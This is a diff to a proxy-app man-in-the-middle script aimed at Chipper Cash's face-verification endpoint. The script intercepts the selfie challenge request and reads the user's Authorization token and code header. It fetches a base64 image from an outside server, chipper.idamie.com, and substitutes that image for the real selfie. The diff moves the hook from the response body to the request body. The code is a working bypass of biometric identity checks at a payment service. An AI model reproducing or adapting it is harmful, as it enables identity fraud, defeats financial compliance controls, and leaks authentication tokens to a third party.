@@ -1,7 +1,7 @@
 /*
 [Script]
 # 替换 selfie 的请求体
-^https:\/\/compliance\.chippercash\.com\/face-verification\/selfie_challenge$ script-response-body https://raw.githubusercontent.com/chucyfunny/chippertest/main/face.js
+^https:\/\/compliance\.chippercash\.com\/face-verification\/selfie_challenge$ script-request-body https://raw.githubusercontent.com/chucyfunny/chippertest/main/face.js
 
 [MITM]
 hostname = compliance.chippercash.com
@@ -9,9 +9,9 @@ hostname = compliance.chippercash.com
 
 const url = 'https://chipper.idamie.com/api/v1/upload/selfie_image';
 
-// 获取响应体和请求头信息
+// 获取请求体和请求头信息
 const request = $request;
-const body = JSON.parse(request.body || '{}');
+const originalBody = JSON.parse(request.body || '{}');
 const token = request.headers['Authorization'] || '';
 const code = request.headers['code'] || '';
 
@@ -44,11 +44,10 @@ if (!token || !code) {
         const base64Data = jsonData.data;
 
         // 替换请求体中的 selfie 字段
-        body.selfie = base64Data;
+        originalBody.selfie = base64Data;
 
-        // 返回修改后的响应体
-        $done({body: JSON.stringify(body)});
-
+        // 返回修改后的请求体
+        $done({body: JSON.stringify(originalBody)});
       } else if (jsonData.error) {
         // 如果服务器返回错误信息，通知用户
         $notify('Error', 'Server Error', jsonData.error);
